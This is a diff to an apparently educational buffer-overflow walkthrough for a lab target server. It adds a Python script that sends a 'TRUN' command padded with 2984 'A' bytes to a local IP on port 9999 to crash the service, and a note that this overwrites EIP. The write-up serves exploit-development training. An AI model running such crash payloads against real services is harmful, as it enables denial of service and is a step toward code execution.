@@ -95,10 +95,28 @@ So we've been able to make the application crash by fuzzing it with 2984 byte (A
 Lets try now to write our own python script that will crash the program, instead of using spike.
 
 ```python
+import socket
 
+s = socket.socket()
+s.connect(("192.168.177.130", 9999))
+
+total_length = 2984
+
+payload = [
+        b"TRUN /.:/",
+        b"A"*total_length
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
 ```
 
 When we run this while monitoring the application in Immunity Debugger, we'll see it crash with EIP filled with "A"s (41414141 in hex), confirming we can control the instruction pointer.
+
+![EIP](Images/image6.png)
 
 ## Step 3: Finding the Exact Offset
 
